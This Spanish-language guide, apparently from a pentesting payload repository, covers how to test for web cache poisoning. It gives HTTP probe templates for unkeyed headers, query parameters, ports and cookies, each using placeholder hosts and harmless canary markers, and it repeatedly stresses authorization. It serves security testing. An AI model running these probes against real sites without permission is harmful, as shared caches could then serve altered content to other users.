# 🗡️ Web cache poisoning: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Cabeceras candidatas fuera de la clave

```text
X-Forwarded-Host: {HOST_PROPIO}
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
Origin: https://{HOST_PROPIO}
Accept-Language: es-PE-canary
```

**Cuándo usarlo:** Probar una por vez con marcador inocuo. Un reflejo en la primera respuesta no prueba caché compartida.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).


### Secuencia de control de caché

```text
1. GET /pagina?cb={NONCE} con cabecera candidata y sesión A.
2. GET /pagina?cb={NONCE} sin cabecera y sesión B propia.
3. GET /pagina?cb={OTRO_NONCE} sin cabecera como control.
```

**Cuándo usarlo:** Verificar Age, X-Cache, Vary y el contenido servido a B; no usar páginas de terceros.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).


## 🧭 Payloads por contexto

### Entradas de URL que pueden no entrar en la clave

```text
/pagina?utm_source=canary-{NONCE}
/pagina?cb={NONCE}&lang=es
/pagina?lang=es&cb={NONCE}
```

**Cuándo usarlo:** Solo una diferencia por vez; comprobar cómo la caché normaliza o descarta query y orden.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).


## 🔥 Payloads avanzados

### Host no incluido en la clave

```http
GET /recurso?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {HOST_PROPIO}
```

**Cuándo usarlo:** No usar dominio de phishing. Confirmar que una segunda cuenta recibe el canary desde el caché.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).


## 🔬 Pruebas guiadas por escenario

### 1. X-Forwarded-Host no incluido en clave

**Objetivo:** Usar URL única para no contaminar páginas comunes.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Interpretación:** Buscar un marcador en respuesta y luego consultar la misma clave sin cabecera desde segunda sesión propia.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).

### 2. Control sin cabecera

**Objetivo:** Comprobar si el contenido alterado se sirve desde caché.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La segunda respuesta debe contener el marcador previo y señales de caché; un reflejo en la primera no basta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

### 3. X-Forwarded-Scheme

**Objetivo:** Comprobar si el backend genera URLs según un header no incluido en clave.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Scheme: http
```

**Interpretación:** Comparar URL generada y clave cacheada con el control; no asumir que cambiar esquema produce XSS.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).

### 4. Query ignorada por caché

**Objetivo:** Detectar parámetro que el backend usa y la caché descarta.

```http
GET /cache-probe-{NONCE}?cb={NONCE}&lang=canary-A HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Repetir con `lang=canary-B` y comparar respuesta/`Age`. Mantener recurso único y público.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).

### 5. Cabecera Origin

**Objetivo:** Verificar si CORS varía sin Vary ni clave adecuada.

```http
GET /cache-probe-{NONCE} HTTP/1.1
Host: {ORIGEN}
Origin: https://{CONTROLLED_HOST}
```

**Interpretación:** Comparar ACAO entre dos orígenes propios; hay riesgo si caché entrega política cruzada útil.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

### 6. Unkeyed port

**Objetivo:** Comprobar si backend refleja puerto y caché lo elimina de su clave.

```http
GET /cache-probe-{NONCE} HTTP/1.1
Host: {ORIGEN}:12345
```

**Interpretación:** Solo si el proxy acepta el host. Confirmar que la respuesta alterada se almacena y alcanza otro cliente.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).

### 7. Cache buster controlado

**Objetivo:** Evitar efectos persistentes en recursos compartidos.

```text
/cache-probe-{NONCE}?cb={NONCE}
```

**Interpretación:** Si el parámetro no forma parte de la clave, escoger una ruta única en lugar de una página popular.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

### 8. Cookie fuera de clave

**Objetivo:** Comprobar si una cookie cambia contenido de una respuesta cacheable compartida.

```http
GET /page?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
Cookie: theme=canary-{NONCE}
```

**Interpretación:** Solicitar luego sin cookie desde otra sesión propia; una variación de UI privada no prueba poisoning.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

### 9. Cabecera Accept-Language

**Objetivo:** Comprobar si la variante idiomática está incluida en la clave de caché.

```http
GET /page?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
Accept-Language: es-PE-canary
```

**Interpretación:** Comparar con otro idioma desde una segunda sesión propia y revisar Vary/edad de caché.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
